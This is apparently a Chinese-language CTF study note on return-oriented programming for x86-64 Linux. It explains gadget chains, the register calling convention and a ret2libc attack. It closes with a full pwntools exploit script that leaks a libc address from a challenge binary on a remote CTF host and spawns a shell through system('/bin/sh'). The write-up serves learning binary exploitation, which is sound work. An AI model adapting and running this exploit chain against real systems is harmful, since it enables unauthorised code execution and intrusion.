复习一下

>`memcpy(v7, v5, v4);` 是 C 标准库函数 `memcpy` 的调用，功能是：
>
>**从源地址 `v5` 开始，复制 `v4` 个字节到目标地址 `v7`。**

也就是说，有两轮检查,第一轮检查v4的上界,第二轮检查v5的长度

常见指令长度示例（x86-64）

| 指令           | 字节数 | 机器码示例       |
| :------------- | :----- | :--------------- |
| `ret`          | 1      | `c3`             |
| `push rbp`     | 1      | `55`             |
| `pop rdi`      | 1      | `5f`             |
| `pop rdi; ret` | 2      | `5f c3`          |
| `mov rbp, rsp` | 3      | `48 89 e5`       |
| `call rel32`   | 5      | `e8 xx xx xx xx` |
| `jmp rel32`    | 5      | `e9 xx xx xx xx` |
| `syscall`      | 2      | `0f 05`          |

这个时候有人就要问了，为什么不是通过入栈赋值呢你个唐

这就要讲到linux64调用参数规定了,**前六个参数都是直接通过寄存器传递的**

>- 第 1 个参数 → `rdi`
>- 第 2 个参数 → `rsi`
>- 第 3 个参数 → `rdx`
>- 第 4 个参数 → `rcx`
>- 第 5 个参数 → `r8`
>- 第 6 个参数 → `r9`

只有第 7 个及以后的参数才压栈

那要怎么操作呢

### `pop rdi; ret`

```
[pop_rdi 的地址]   ← ret 会跳到这里
[0x1145141919810721] ← pop rdi 会把这个值弹到 rdi
[backdoor 的地址]  ← pop rdi 后的 ret 会跳到这里
```

函数结束，ret跳转到pop_rdi，执行该操作，然后赋值给rdi,执行完的ret再跳转到后门，即可操作

攻击思路

由于只有一次调用，所以我们得泄露一次其真实地址（跳过ASLR），然后重新跑一遍跳转到system以及/bin/sh

总之我们需要的是rdi,rsi放个0占位就好

from pwn import *

elf = ELF('./hardlibc')
libc = ELF('./libc.so.6')

pop_rdi_pop_rsi = 0x401185
main_addr = elf.symbols['main']
ret = 0x401016

payload1 = b'a' * 40 + p64(pop_rdi_pop_rsi) + p64(elf.got['puts']) + p64(0) + p64(elf.plt['puts']) + p64(main_addr)

p = remote("node.szu.moe", 10011)
# p = process('./hardlibc')
p.sendline(payload1)
leak = p.recvline().strip().ljust(8, b'\x00')
puts_addr = u64(leak)
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'A' * 40
payload2 += p64(ret)                    
payload2 += p64(pop_rdi_pop_rsi)         
payload2 += p64(binsh_addr)             
payload2 += p64(0)                      
payload2 += p64(system_addr)            
p.sendline(payload2)
p.interactive()
